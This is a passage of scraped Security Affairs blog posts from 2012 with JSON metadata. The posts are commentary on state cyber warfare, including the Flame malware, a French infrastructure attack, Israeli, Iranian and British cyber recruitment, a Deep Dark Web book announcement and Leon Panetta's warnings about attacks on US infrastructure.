\u201cWe cooperate in many security-related areas. I am here to further reinforce those ties and create new ones.\u201d\n\nOnce discovered the malware the Agence nationale de la s\u00e9curit\u00e9 des syst\u00e8mes d\u2019information (Anssi) has isolated the network to collect evidences of the attack and of course to secure the IT infrastructure. The clean-up operation lasted several days due the complexity of the attack.\n\nAt the moment there aren\u2019t official announcements from French government, accredited sources revealed that national infrastructures are steadily under attack,  last May they were hit byother  two large scale cyber attacks.\n\nThe event certainly will leave a mark on the diplomatic relations between the countries and it is the confirmation of the commitment of any countries in cyber warfare. Every government is improving its cyber capabilities but event like this are not isolated, each state is exploring every way to obtain sensible information on competitors and allies.\n\nAnother meaningful factor associated with the use of malware is that any government today could have manipulated the source code of Flame to conduct an attack doing the blame on the United States or Israel, we live in the age of disinformation and of relocation of cyber threat, in cyberspace every certainty becomes evanescent.\n\nThe mystery is dense!\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/facebook", "topic_name": "Facebook"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/france", "topic_name": "France"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/middle-east", "topic_name": "Middle East"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-cyber-warfare", "topic_name": "US cyber warfare"}]}, {"news_name": "Reflections on Infomation Warfare Conference 2012", "news_link": "https://securityaffairs.co/wordpress/10219/cyber-warfare-2/reflections-on-infomation-warfare-conference-2012.html", "title": "Reflections on Infomation Warfare Conference 2012\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 13, 2012", "body": "Last week I attended the third Annual Information Warfare Conference, an interesting opportunity to understand the evolution of cyber warfare scenario specifically for my Italian context. One of the main reflection raised is the limited knowledge on the social-economic impact of the concept of cyber weapon, the majority of governments are currently working to improve their cyber capabilities and this is bringing to a fragmentation of the power.\n\nWorldwide community is facing with the difficulty to maintain order and stability, within individual states and among the states themselves, and with the inefficiency of deterrence strategy.\n\nThe absence of a cyber regulatory is one of the main problems, cyber warfare concept has upset every geopolitical order, the concepts of time and space are outdated, the menace grows in what is considered the fifth domain and ports its devastating effects in real life.\n\nThe Italian institution are working to adopt a national cyber strategy that will be able to identify the cyber threats, related risks and to define guide lines to approach an effective defense.\n\nThe cyber weapons represent an integration to conventional military operations, the warfare level must be approached on the three levels, tactical, strategic and operative.\n\nThe ambassador Giampiero Massolo, Secretary General of the Italian Ministry of Foreign Affairs and General Director of the Department of Information Security from the Presidency of the Council, has reiterated the need to define a proper  \u201cglobal defensive cyber strategy\u201d promoting awareness campaigns on cyber security.\n\nThe presentation of the ambassador was very interesting, he explained how is changed the concept of war:\n\n \n\n\n\nIn a similar context the \u201cearly warning logic\u201d assumes a fundamental role, the activities of prevention and intelligence are critical to identify threats in time. No signal from internet and Deep Web to be overlooked, it\u2019s fundamental in my opinion to analyze the networks, social network platforms and social media represent a privileged mine of information for an attackers and security agencies must be aware that they could expose them to further cyber attacks amplifying attack surface, it\u2019s is happened with high official of Nato and it could happen again.\n\nRADM Nicola De Felice, IT Navy Director of the Centre for Defence Innovation (CDI), introduced the concept of cyber weapon explaining the menace it brings to homeland security. The official alerts on the need of dedicated cyber structures, under the control of a unique governance, to acquire the national cyber situation and to prevent cyber attacks.\n\nRADM De Felice raised also the question to develop alerting systems that have autonomous response capabilities, US DARPA department according the Washington Post journal has already developed the \u201cunmanned response\u201d capability.\n\nWhich will be the future application of these systems, will humans trust judgment of the machines?\n\nIn these optical is also fundamental consider the possible collateral damage of a cyber operation that are damage caused to entities that aren\u2019t the target of the attacks.\n\nAnother argument that  that has been addressed on several occasions is also the need to involve knowledge of civil, to combat cyber threats must think like those who attack. The view is shared simultaneously by several governments, China, U.S. and UK have started programs to recruit and to form hackers to involve in cyber operations.\n\nAnd what about Italy? Let me say that it is very s difficult  analyzing the current situation. The academic world that should forge new resources is really far from the demands on cyber security as confirmed by the expert  Shai Blitzblau, Group Managing Director at MAGLAN Defense & Intelligence.\n\nInteresting also to analyze the changing needs of the leading manufacturers of systems for the defense, according Marco Donfrancesco, Head of Global Intelligence & Security for Selex, the producers of critical systems such as Selex wonder if their equipment are resistant to cyber attacks, and for this reason it is necessary to change completely the test methodology. Donfrancesco stresses that the cyber threat is evolving with disarming speed while the production cycles are increasingly compressed.\n\nThe test must be stressed from the outside as well as inside by selected specialists that cannot be limited to the execution of static test sessions.\n\nMarco Donfrancesco with his presentation raise a couple of extremely thorny issues:\n\nThe entire discussion presented during the conference highlights how cyber warfare is influencing the defense strategies of every governments requesting a review of decisional processes.\n\nA new concept of cyber diplomacy is growing, it is mandatory to work for a global collaboration inter states to prevents that cyber threats will create serious damages to a global economies. The cyber warfare scenario is rapidly evolving and governments must align their strategies.\n\nWhich are the main upcoming investors for the development of cyber capabilities and cyber weapons?\n\nCroatia, Poland, Estonia, Netherland, Sweden, Spain, Japan and Malaysia. I hope to view also Italy in list during the next conference, we have the knowledge to make the difference.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategy", "topic_name": "cyber strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-terrorists", "topic_name": "cyber terrorists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/defense", "topic_name": "defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-network", "topic_name": "Social Network"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uk", "topic_name": "UK"}]}, {"news_name": "Nation state sponsored attacks: the offensive of Governments in cyberspace", "news_link": "https://securityaffairs.co/wordpress/10203/security/nation-state-sponsored-attacks-the-offensive-of-governments-in-cyberspace.html", "title": "Nation state sponsored attacks: the offensive of Governments in cyberspace\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 12, 2012", "body": "\n\nPierluigi Paganini,\n\nDavid Pace,\n\nPublishers of mainstream ICT news are ablaze with articles on the evolution of the \u201cFlame\u201d malware targeting the Middle East region for cyber espionage purposes, and new menaces such as Gauss or Shamoon.  No longer the province of deviant black-hat hackers or transnational organised crime groups, malware is now being actively developed and deployed by Nation States.\n\nGovernments publicly claiming to be champions of liberty and civil rights, and Governments accused by the same of being oppressive regimes, are throwing buckets of their respective tax-payers money into aggressively developing similar \u201coffensive\u201d signal intelligence and cyber war capabilities to monitor, infiltrate, analyze, deceive, subvert, and to destroy in the name of \u201cdefence\u201d (National Interest).\n\nGovernments like Iran, the U.S., North Korea, Russia, the UK, and China are all making large investments into developing general-purpose offensive capabilities that can be used in war and for law enforcement purpose.   In fact, estimates indicate that more that 140 states all over the world are working on creating cyber weapons.   Governments, like Australia, are considering use of many of these offensive cyber techniques as part of their day-to-day civilian law enforcement activities.\n\nGovernments assert that our personal security can only be assured by those in positions of privileged authority (having the capability) to aim kinetic and non-kinetic weapons at every human on earth, including at you and your children.\n\nWithin this context, a classic feature of military doctrine is to protect and disguise, the true and total extent of national capabilities in areas related directly to the conduct of security-related activities.  This doctrine is now leaking into civilian legal systems.  Governments are increasingly asserting that they require less (inadequate) oversight by the civilian community, in order to ensure their ability to threaten violence against civilians, to ensure our individual and collective security\u2026\n\nIt is hardly surprisingly in this anarchistic international system of control, through the threat of violence, that mainstream articles in the popular media abound on claims and counter-claims of various cyber operations conducted by nation state sponsored hackers to infiltrate other nation state (and civilian) networks  for cyber espionage or cyber offensive purposes.   Unfortunately, there is plenty of credible data to back up these accusations.\n\nIn 2010, William J. Lynn, U.S. Deputy Secretary of Defense, states that:  \u201cas a doctrinal matter, the Pentagon has formally recognized cyberspace as a new domain in warfare . . . [which] has become just as critical to military operations as land, sea, air, and space.\u201d\n\nStated differently, the Internet, just like your school and corner shop, is an exciting new domain in warfare.   And they are putting our collective money where their mouth is.   In 2010-2011, the United States spent  $80 BILLION  on signals intelligence (spying activities), of which  $53.1 BILLION  was spent on NON-military intelligence programmes.   Last financial year (2011-2012), the US spent another  $75 BILLION on spying.   This spending includes investments like the USD  $2 BILLION  U.S. National Security Agency  Data Center being built in Utah (code-breaking, 100+ year data-storage).  Building on these solid foundations, the U.S. is now increasingly focusing on the full exploitation of cyber vulnerabilities.\n\n \n\nThe most public U.S. cyber-war projects are:  Plan X, a DARPA project for the development cyber warfare technologies that reputable sources claim seeks to track exploitable vulnerabilities of every (civilian, commercial, \u2026) device connected to the Internet, and ACT (Agile Cyber Technologies), a project developed by Air Force Research Laboratory (AFRL).\n\nIn 2009, U.S. National Journal published an article asserting that U.S. Forces employed cyber-warfare in Iraq in 2003.   In 2012 we now have official statements from Marine Lieutenant General  Richard P. Mills  who declared that the U.S. military has been launching cyber attacks against its opponents in Afghanistan.  This senior officer explained, that the U.S. considers oversight of cyber space as highly strategic, giving great importance to the study and implementation of new cyber weapons as the new *way to fight*.  Mills declared:\n\n\u201cI can tell you that as a commander in Afghanistan in the year 2010, I was able to use my cyber operations against my adversary with great impact,\u201d \u2026 \u201cI was able to get inside his nets, infect his command-and-control, and in fact defend myself against his almost constant incursions to get inside my wire, to affect my operations.\u201d\n\nNot surprisingly, the Pentagon spokesman Lt. Col. Damien Pickart refused to give more information on  Mills\u2019s statements, claiming reasons of security:\n\n\u201cwe do not provide specific information regarding our intentions, plans, capabilities or operations.\u201d  In short, don\u2019t ask us to be accountable to you civilians for the means we use to protect you.\n\nBut this raises the question, why a high-ranking U.S. officer made these public revelations in the first place? \n\nBetween 1970 and 2000, individuals and organizations concerned with protecting their personal privacy and corporate secrets were engaged in heated discussions with governments around the world for the response-ability to employ high assurance security techniques and technologies to safeguard their legitimate interests, and those of their stakeholders.  Most Governments refused this ability to their civilian population, in the name of National Security, preventing them from building genuinely secure systems, leading to today\u2019s \u201cinsecure\u201d ICT ecosystem.\n\nWith so many Governments now investing in cyber warfare, and with our Government and Civilian cyber systems so insecure, it\u2019s easy to understand the strategic importance of a sound cyber strategy.\n\nIntelligence agencies and police forces have risen to the challenge, calling for greater surveillance capabilities to identify people online and monitor all communications activity (which could potentially include cyber-attacks or criminal activities).  However, for surveillance technologies to be cost effective, today\u2019s ICT systems have to transmit data in the clear and/or be insecure in practice.   Furthermore, for \u201cdefensive\u201d cyber-ATTACKS by authorities to work, our ICT systems must have exploitable security flaws in their implementation.  In short, for these Agencies to defend our vulnerable ICT systems based on this strategy, they would require our ICT systems to remain insecure and vulnerable to surveillance and exploitation\u2026  The formula being:\n\n\u201cFor greater security engage in deeper privacy invasion, accelerate sharing of intelligence, and ensure all civilian ICT systems are/remain insecure, so we can employ more surveillance and cyber attacks in the name of your defence\u2026\u201d\n\nHowever this is an outright flawed formula due to the cyber attribution problem. As the UK Cyber Strategy states: \u201cwith the borderless and anonymous nature of the internet, precise attribution is often difficult and the distinction between adversaries is increasingly blurred.\u201d  For example, in September 2012, Estonia\u2019s State Prosecutor\u2019s Office announced that it was bringing the investigation of the country\u2019s 2007 cyber attack to a close.  The decision to shut down the investigation came after prosecutors failed to pin down the IP addresses, and computers used, during the digital barrage in April and May 2007.  In short, the Estonian Government could not find out who the attacker was.\n\nSo, how can anybody distinguish between a state-sponsored attack, and an attack by mere cyber criminals who are opportunistically exploiting the weaknesses in our systems that Governments allow?\n\nUnfortunately, due to this cyber attribution problem, it is very hard to distinguish state-sponsored attacks from opportunistic cyber criminal offensives.   \u201cGood\u201d and \u201cBad\u201d Governments, and cyber-criminals all use similar techniques, and exploit the same vulnerabilities.  According to the results of a study by Leyla Bilge and Tudor Dumitras from Symantec Research Labs, titled: \u201cBefore We Knew It \u2026 An Empirical Study of Zero-Day Attacks In The Real World\u201d, a zero-day attack has an average duration of 312 days, and once publicly disclosed, increases of 5 orders of magnitude of the volume of attacks can be observed.  The experts explained how knowledge of this type of vulnerability gives governments, hackers and cyber criminals \u201ca free pass\u201d to exploit every target whilst remaining undetected.\n\nWhile today\u2019s statistics appear to indicate that the majority of cyber attacks seem connected to hacktivism and cybercrime activities, this is arguably because a) many Nation States are relatively new entrants, b) only a few attacks are indisputably state sponsored.  e.g. How many white-collar criminals spend their days dreaming up the destruction of centrifugal systems in Iran?\n\nPhil Lin, director of product marketing at FireEye, noted:\n\n\u201cCybercriminals from one country can easily set up \u2018command and control (C&C)\u2019 servers used to store exfiltrated data in a different country leading to incorrect attribution of the nationality of the threat actors, not to mention their ultimate nation-state ties.\u201d   Furthermore, according to UK Cyber Strategy: \u201cSome states regard cyberspace as providing a way to commit hostile acts \u2018deniably\u2019.\u201d\n\n\n\nThe fact is:  Cyber War is increasingly indistinguishable from Cyber Crime.\n\nAccording to Scott Camil, a former sergeant in the U.S. Marine Corps who served four years in Vietnam (his decorations include two Purple Hearts, a Combat Action Ribbon, two Presidential Unit Citations and Good Conduct Medal): \u201cThe No.1 War crime is starting a war, because all other war crimes emanate from that first crime.\u201d  In like spirit, it can be argued that the decision to develop and maintain the capability for engaging in cyber war is the first crime, engaging in cyber war being the second.\n\nIn the short term, the number of cyber operations is expected to have rapid growth.  It is \u201cextremely unlikely\u201d that, in the absence of international regulation in cyber warfare, a country will openly admit sponsoring operations.\n\nIt is essential that Governments all over the world begin working on the definition of an international cyber regulation, because in absence of strict rules and limitations, technical capabilities of the states will evolve in an unpredictable manner and it will become impossible to qualify the nature of malicious code and to discover the identity of its creators, resulting in serious negative consequences to the stability and well being of the global community.\n\nLikewise, as cyber attacks rely on the existence of exploitable cyber vulnerabilities, Are Governments going to continue investing in the ability to inflict pain, or will they invest in advancing the collective protection of the global community by promoting and ensuring civilian ICT systems are actually secure in practice?\n\n \n\nAbout the Authors:\n\nPierluigi Paganini,  Deep web expert and Security Specialist CISO Bit4ID Srl, a CEH Certified Ethical Hacker, EC Council and Founder of Security Affairs ( securityaffairs.co ).

Apparently everything seems crystallized waiting for one of the contenders make the first move, in fact, both states are boosting investment in the development of their cyber capabilities.\n\nThe cyberspace is the domain in which both countries are trying to offend the adversaries, recently the Israel\u2019s Channel 2 reports that the Israel Defense Forces is planning to double the number of actual members of the well-recognized Unit 8200, the Israeli Intelligence Corps unit responsible for collecting signal intelligence and code decryption. The unit is responsible to conduct both defensive and offensive operations in the cyberspace, a domain considered fundamental by Israel government.\n\nThe Israel cyber unit is considered one of the most active in the creation of offensive tools, majority of security experts blamed it for the creation of Stuxnet virus in a joint venture with US. Stuxnet is not the only malware designed to attack a foreign state through the cyberspace, let\u2019s remind in fact the recently analysis on Flame malware are demonstrated an intense activity of cyber espionage in Middle East area, and also in this case appears high probable the support of Israel cyber units.\n\nA conflict in the cyberspace is very difficult to engage, in many cases a country suffers continuous cyber attacks that appear conducted by state-sponsored hackers but there is no certainty about their origin, we must also consider that it is possible to intentionally make a series of offensives against a state so that the blame falls on nations not really involved, the strategy of misinformation is considerable one of the primary option in a case of conflict.\n\nWhen we speak of cyber war we must be really careful, collect evidences of attacks is hard. During the last Cyber Threat Summit in Dublin I presented my research \u201cThe rise of cyber weapons and relative impact on cyber space\u201d highlighting the expense of main countries that we consider most advanced in cyber warfare scenario.\n\n\n\nUS, China, UK, Iran, and at least other 140 States all over the world are currently working to the creation of a new generation of cyber weapons, despite the substantial cuts in military spending due the global crisis these investments in cyber warfare are increasing in impressive way.\n\nThe Channel 2 presented an advanced technological Israel that has recruited expert hackers to aggregate the unit Unit 8200 with the slogan:\n\n\u201cif you\u2019re a computer genius, this is the place for you!\u201d.\n\nRichard Silverstein, a famous author, journalist and blogger, with articles appearing in Haaretz, the Jewish Forward, Los Angeles Times and many other important press agencies argues in an article published on Tikun Olam with the propaganda of the Israeli government.\n\nThe journalist remarks that a cyber attack could cause the loss of human lives and serious damage, he is scared by the fact that simply using a keyboard it is possible to destroy a critical infrastructure, interrupt telecommunications or highjack defense missiles against their owners.\n\nThe famous author writes:\n\n\u201cAs I\u2019ve written, it\u2019s only a matter of time before someone pushes a Send button and unleashes code that derails a train, causes an explosion in a power plant, or poisons a water supply.  Even Leon Panetta warned of this eventuality.  Only of course, he warned of someone doing it to us, rather than us doing it to someone else.  We all know that the things you accuse your opponent of wishing to do to you are the same things you\u2019d do to him given half a chance.\u201d\n\nThe recruiting of aspiring cyber experts is very effective, a network of head hunters in the country look for high school students that are following an educational path characterized by the predominance of IT material. This is not the only way to recruit cyber specialists, great relevance is taken by social media, IDF is searching for them also analyzing forums and social networks.\n\nThe initiative of IDF to increase the capabilities of its cyber units recruiting youngsters is not new, just last week I\u2019ve written of similar initiative of Britain\u2019s Government Communications Headquarters (GCHQ) intelligence agency and even before of Chinese cyber army.\n\nBut if Israel is recruiting new cyber units we cannot ignore the progresses of Tehran, the Iranian governments is intensifying its cyber activities, in particular fearing a powerful cyber attack it is trying to secure the infrastructures of the countries.\n\nI believe that Iran is making meaningful progresses in cyber warfare and soon it will be very dangerous also thanks to the support of cyber mercenaries.\n\nIranian government is aware that the enemy is increasing cyber capabilities that will use against vital components of the countries, that\u2019s why Iran should adopt a smart civil and cyber defense strategy against this attackers according the declarations of Head of Iran\u2019s Civil Defense Organization Brigadier General Gholam Reza Jalali.\n\n\u201cso, threats determine the direction of our movement\u201d. \u201cI think that utilizing hi-tech is like playing in enemy\u2019s court because it has been developed based on the capabilities of the enemy,\u201d\n\nHe then said the US and Israel own a major share of infrastructural companies and hi-tech firms to the very same end. \u201cThus, Iran is necessitated to design a new model for cyber defense,\u201d\n\nIran is daily hit by a large number of cyber attacks, they are making a great experience in this sense and the experts of the government are learning on how to monitor foreign offensives and how to defend country\u2019s industrial systems.\n\nDon\u2019t forget that country\u2019s experts were the first, such as Kaspersky Lab Team, to be able to neutralize \u201cFlame\u201d virus discovered last may using an indigenous anti-virus software.\n\nLet\u2019s remind also that last April 24 country\u2019s experts had limited the effects of a series of cyber attacks against the country\u2019s Oil Ministry, Hamdollah Mohammadnejad, deputy minister in engineering affairs, according the Fars News Agency declared :\n\n\u201cRecently, a few number of National Iranian Oil Company (NIOC) servers were attacked by a malware, but the cyber security experts of oil industry contained it immediately.\u201d \n\nWe all must be aware of the progress of Iran in cyber warfare scenario, at least on the defense perspective \u2026 but what will happen if similar progress have been obtained also on the offensive perspective?\n\nAre we ready to neutralize a cyber weapons, such as Stuxnet, created by its experts?\n\nIt\u2019s quite strange, but this time we are observing more propaganda made by Western governments that objective results obtained from the improvement of cyber capabilities \u2026\n\ncountries such as Iran and North Korea must be monitored with great attention in cyber warfare scenario.\n\nPierluigi Paganini\n\n", "topics":

about the enormous potentiality of gaming platforms and of the capabilities of young players, months ago I introduced a US project to develop an application to spy on gaming console all over the world gathering precious information on their owners.\n\nThe control of a gaming console could be used to spy on victim\u2019s environment, today the gaming platform are equipped with cameras that could be an eye on user\u2019s domestic environment.\n\nBut gaming console could be used also for recruiting purposes, Britain has recently announced a new spy recruitment program who wants to draw from the video game players, the term used to refer the world of video gamers is the \u201cXbox generation\u201d.\n\nThe typical profile requested is young guy, without a university education but with a great attitude in the use of new social media and computer game skills of course.\n\nBritain\u2019s Government Communications Headquarters (GCHQ) intelligence agency is looking for 100 new recruits to be involved in an apprenticeship program for the creation of a new generation of cyber spies. The announcement was made by Foreign Secretary William Hague during a conference at Bletchley Park.\n\n\u201cWe face constant and growing threats from crime and attacks in cyberspace,\u201d \n\n\u201cWe want to step up our efforts to find the most talented people to help sustain and secure the UK\u2019s code-breaking and cyber expertise for the future.\u201d\n\n\u201cIt will be the young innovators of this generation who will help keep our country safe in years to come against threats which are every bit as serious as some of those confronted in the Second World War.\u201d \n\nThe mode of recruiting is revolutionary for UK government, in the past the secret agencies mainly drew from principal universities selecting most promising pupils, the must was the obtaining of A-level qualifications with strong capability in science and mathematics.\n\nThe campaign is clear opening to a new kind of professional, more oriented to the practice, a figure with a great familiarity with cyber tools that follow the trend already introduced by other countries such as China.\n\nNo wonder if the particular qualities of that boys were taken to the creation of new legions of hackers trained using the most advanced methods and involved in cyber operations, this is the future, and thanks to the young talents governments intend to preside over the cyber space. These new skills are not taught at the university, the chosen ones will have to show great passion for the cyber security, high elasticity and mental aptitude to work for objectives \u2026 exactly as they do when they play with their console, passing level by level.\n\nOf course the recruiting program is intensive, recruits will spend two years at GCHQ studying cyber security and engineering, consider that UK has a primary role in the cyber space and it is considered one of the nation with major investments for the improvement of cyber capabilities.\n\nThe training schedule includes a foundation degree course in communications, security and engineering at De Montfort University in Leicester and specific study for a level 4 diploma in IT specific for software, web and telecommunications professional competence.\n\nUK Government has established an extra investment to develop deterrents to hostile malware and hackers that amount to 650M \u00a3 in 2012.\n\nA foreign Office spokeswoman declared:\n\n\u201cIf the UK is to maintain a leading role on cyber issues to enhance the UK\u2019s economic growth, we must harness experts from the \u2018Xbox generation\u2019 who have grown up with a world of social media, global connectivity and interactive gaming,\u201d\n\nThe way to conduct an attack is profoundly changed and also the simulation of conflict that appear similar to a video games, and youngsters are very familiar with them.\n\nForeign Secretary William Hague declared that UK is victim of an escalation of cyber attacks of any type, from cyber espionage to offensives that aim to disrupt infrastructure, communications and satellite systems:\n\n\u201cnot an hour goes by when a system in the UK is not being attacked\u201d, he said\n\nHague is convinced that the majority of attacks are state-sponsored, organized groups hit strike government networks representing a serious cyber threat for UK\u2019s security and economic competitiveness.\n\nRecently Pacific Command organized a series of exercise in war-games style on a 7-inch-high box with NATO and other international partners to verify the reliability of the communication channels during a cyber attack. The goal of this exercise is to ensure communication between entities in case of attacks.\n\nIn other simulation dedicated appliances are intentionally infected to verify the response of an infrastructure to the diffusion of a malicious agent.\n\nWe can describe dozen of similar exercises made all over the world made by different cyber units, in each of them a team acts as attackers and another as defender, in the middle we locate the entities representing population and vital services of a countries.\n\nScope of the simulations is to evaluate the impact of cyber operations on the defense system and also on the \u201cmiddle\u201d entities trying to detect possible flaws in computer systems and response procedures.\n\nIn this scenario it is simple to understand how much important is the introduction of youngsters experts of video games and simulations, how fundaments is the role of hackers in today cyber warfare,  these figures are crucial to develop and test capabilities of a countries and also to conduct a cyber offensive \u2026.\n\nUK Government \u2026 passed with flying colors for the initiative.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gaming-platforms", "topic_name": "gaming platforms"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gchq", "topic_name": "GCHQ"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-media", "topic_name": "social media"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uk", "topic_name": "UK"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/xbox-generation", "topic_name": "Xbox generation"}]}, {"news_name": "The Deep Dark Web Book Released", "news_link": "https://securityaffairs.co/wordpress/9607/cyber-crime/the-deep-dark-web-book-released.html", "title": "The Deep Dark Web Book Released\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 21, 2012", "body": "\n\nAfter much work during the last months I\u2019m proud and happpy to announce the publishing of The Deep Dark Web book.\n\nIt is AVAILABLE @Amazon website  http://www.amazon.com/The-Deep-Dark-Web-hidden/dp/1480177598 PAPER BOOK\n\nIt is AVAILABLE @Amazon website  http://www.amazon.com/dp/B009VN40DU KINDLE\n\nIt is AVAILABLE @SmashWords website  http://www.smashwords.com/books/view/247146\n\nIt is AVAILABLE @Barnes & Noble website    http://www.barnesandnoble.com/w/the-deep-dark-web-pierluigi-paganini/1113594408?ean=2940015852837\n\nand we have uploaded it also to Amazon kindle, it should be searchable within 24-36 hours and everyone can rush in and purchase one.\n\nWriting the book was an adventure, a pleasure that I shared with my friend and co-author Richard Amores, a true expert in the field.\n\nThese months have been hard, they were months of study and research, of satisfaction and disappointment \u2026. it was exciting as the contents of the book that we have tried to share with you. These are sensitive issues, uncomfortable, which many believe is better not to talk \u2026 we did it regardless in the simplest of ways.\n\n  \n\n\n\nThis Book covers the main aspects of the fabulous and dangerous world of -\u201cThe Deep Dark Web\u201d . We are just two cyber specialists Pierluigi Paganini & Richard -gAtO- Amores, with one passion and two souls we wanted to explain the inner working of the deep dark web. We have had a long collaboration in this efforts to document our findings we made infiltrations into the dark places inaccessible to many to give a you the reader a clear vision on the major mystery of the dark hidden web that exist today in the Tor Onion network..\n\nThe Web, the Internet, mobile cell devices and social networking has become commonly used words that identify technological components of daily Internet user\u2019s experience in the cyberspace. But how much do we really know about cyberspace? Very, very little, Google / Yahoo / Bing only show us 20% of the Internet the other 80% is hidden to the average user unless you know were to look.\n\nThe other 80% of the Internet is what this book is about the \u201cDeep Dark Web\u201d, three words with millions of interpretations, mysterious place on the web, the representation of the hell in the cyberspace but also the last opportunity to preserve freedom of expression from censorship. Authorities and corporation try to discourage the use of this untapped space because they don\u2019t control it. We the people of the free world control this network of Tor -Onion Routers by volunteer around the world.\n\nThe Deep Dark Web seems to be full of crooks and cyber criminals, it is the hacker\u2019s paradise, where there are no rule, no law, no identity in what is considered the reign of anonymity, but this is also the reason why many persecuted find refuge and have the opportunity to shout to the world their inconvenient truths.\n\nThe Deep Dark Web is a crowded space with no references but in reality it is a mine of information unimaginable, a labyrinth of knowledge in the book we will try to take you by the hand to avoid the traps and pitfalls hopefully illuminating your path in the dark.\n\nCybercrime, hacktivism, intelligence, cyber warfare are all pieces of this complex puzzle in which we will try to make order, don\u2019t forget that the Deep Dark Web has unbelievable opportunity for business and governments, it represents the largest on-line market where it is possible to sell and acquire everything, and dear reader where there is $money$ you will find also banking, financial speculators and many other sharks.\n\nDo you believe that making money in Deep Web is just a criminal prerogative? Wrong, the authors show you how things works in the hidden economy and which are the future perspectives of is digital currency, the Bitcoin.\n\nThis manuscript proposes both faces of the subject, it illustrates the risks but also legitimate use of anonymizing networks such as TOR adopted by journalist to send file reports before governments agents censored his work .\n\nHere are some question we may answers to:\n\nHow many person know about the cyber criminals and their ecosystem in the deep web? \nHow many have provided information on the financial systems behind the \u201cdirty affairs\u201d? \nHow the law enforcement and governments use Dark Web?\n\nLet\u2019s hold your breath and start the trip in the abyss of knowledge to find answers to the above questions. We hope that with this book you can learn something new about \u2013 The Deep Dark Web.\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymity", "topic_name": "anonymity"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/bitcoin", "topic_name": "Bitcoin"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/deep-web", "topic_name": "Deep Web"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-2", "topic_name": "security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-media", "topic_name": "social media"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tor", "topic_name": "Tor"}]}, {"news_name": "Secretary of Defense Panetta on U.S. cyber capabilities", "news_link": "https://securityaffairs.co/wordpress/9403/security/secretary-of-defense-panetta-on-u-s-cyber-capabilities.html", "title": "Secretary of Defense Panetta on U.S. cyber capabilities\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 14, 2012", "body": "Without doubts the man that has attracted the media attention in the cyber warfare scenario is Defense Secretary Leon Panetta, in my opinion one of the officers most farsighted and prepared on the politicians.\n\nPanetta has alerted US government on the high risks of cyber attacks against U.S. critical infrastructures and network, the opponents are increasing their cyber capabilities and represent today a serious menace.\n\nThe words used by the official last Thursday are very strong, The United States is in a \u201cpre-9/11 moment,\u201d referring to a possible series of cyber attacks against his country.\n\nDuring his  speech in New York City, Panetta declared that U.S. intelligence community fears a combined threat of cyber terrorism and other attacks that could have effect similar to 9/11.\n\nThe possible targets of a cyber attacks are multiple, from nuclear plants to telecommunications system and U.S., such as many other country are still too vulnerable.\n\n\u201cThe attackers are plotting. Our systems will never be impenetrable, just like our physical defenses are not perfect. But more can be done to improve them.  We need Congress, and we need all of you, to help in that effort.\u201d Said the Defense Secretary\n\nThe revelation of Panetta are disturbing, the U.S. cyber experts have collected evidences, in different occasions, that foreign attackers accessed to control systems for applications running in critical infrastructures.\n\nA successfully attacks on public utilities could spark the \u201ccyber Pearl Harbor\u201d according the Defense Secretary.\n\nWe have learnt how much dangerous is cyber attacks, it could be stealth for several years causing concrete damages and lost of confidential information and intellectual property.\n\nPanetta declared:\n\n\u201cThese attacks 